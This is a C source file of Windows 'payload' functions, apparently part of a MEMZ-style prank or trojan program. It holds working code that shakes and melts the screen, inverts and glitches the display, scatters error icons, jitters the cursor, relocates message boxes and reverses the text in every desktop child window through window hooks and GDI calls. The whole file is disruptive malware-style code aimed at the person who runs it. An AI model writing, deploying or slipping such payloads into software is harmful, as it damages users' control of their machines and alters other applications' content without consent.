#include "Payloads.h"
#include "Utils.h"
#include "GDI.h"

#pragma region Message Box Payload
PAYLOAD payloadMessageBox(LPWSTR text, LPWSTR label, int style) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, text, label, style);
	UnhookWindowsHookEx(hook);
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (GetSystemMetrics(SM_CXSCREEN) - pcs->cx);
			int y = random() % (GetSystemMetrics(SM_CYSCREEN) - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
#pragma endregion

#pragma region Reverse Text Payload
PAYLOAD payloadReverseText() {
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}

	GlobalFree(str);

	return TRUE;
}
#pragma endregion

#pragma region Sound Payload
const char *sounds[] = {
	"SystemHand",
	"SystemQuestion",
	"SystemExclamation"
};

PAYLOAD payloadSound() {
	PlaySoundA(sounds[random() % (sizeof(sounds) / sizeof(char *))], GetModuleHandle(NULL), SND_ASYNC);
}
#pragma endregion

PAYLOAD payloadGlitch() {
	InitHDCs

	int x1 = random() % (w - 100);
	int y1 = random() % (h - 100);
	int x2 = random() % (w - 100);
	int y2 = random() % (h - 100);
	int width = random() % 600;
	int height = random() % 600;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);

	FreeHDCs
}

PAYLOAD payloadTunnel(int scale) {
	InitHDCs
	StretchBlt(hdc, scale, scale, rekt.right - scale*2, rekt.bottom - scale*2, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
	FreeHDCs
}

PAYLOAD payloadDrawErrors() {
	InitHDCs

	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;

	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (random() % 4 == 0) {
		DrawIcon(hdc, random() % w, random() % h, LoadIcon(NULL, IDI_WARNING));
	}

	FreeHDCs
}

PAYLOAD payloadInvertScreen() {
	InitHDCs
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	FreeHDCs
}

PAYLOAD payloadCursor(int power) {
	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (power)), cursor.y + (random() % 3 - 1) * (random() % (power)));
}

#pragma region Clear Windows Action
ACTION clearWindows() {
	EnumWindows(&CleanWindowsProc, NULL);
}

BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam) {
	DWORD pid;
	if (GetWindowThreadProcessId(hwnd, &pid) && pid == GetCurrentProcessId()) {
		SendMessage(hwnd, WM_CLOSE, 0, 0);
	}
	return TRUE;
}
#pragma endregion

PAYLOAD payloadEarthquake(int delay, int power) {
	InitHDCs

	HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, screenshot);

	BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	BitBlt(hdc, 0, 0, w, h, hdc2, (random() % power) - (power / 2), (random() % power) - (power / 2), SRCCOPY);
	Sleep(delay * 10);
	BitBlt(hdc, 0, 0, w, h, hdc2, 0, 0, SRCCOPY);

	DeleteDC(hdc2);
	DeleteObject(screenshot);

	FreeHDCs
}

PAYLOAD payloadMeltingScreen(int size, int power) {
	InitHDCs

	HBITMAP screenshot = CreateCompatibleBitmap(hdc, size, rekt.bottom);
	HDC hdc2 = CreateCompatibleDC(hdc);
	SelectObject(hdc2, screenshot);

	for (int i = 0; i < power; i++) {
		int x = random() % (w - size);

		BitBlt(hdc2, 0, 0, size, h, hdc, x, 0, SRCCOPY);

		for (int j = 0; j < size; j++) {
			int depth = sin(j / ((float)size)*3.14159)*(size / 4);
			StretchBlt(hdc2, j, 0, 1, depth, hdc2, j, 0, 1, 1, SRCCOPY);
			BitBlt(hdc2, j, 0, 1, h, hdc2, j, -depth, SRCCOPY);
		}

		BitBlt(hdc, x, 0, size, h, hdc2, 0, 0, SRCCOPY);
	}

	DeleteDC(hdc2);
	DeleteObject(screenshot);

	FreeHDCs
}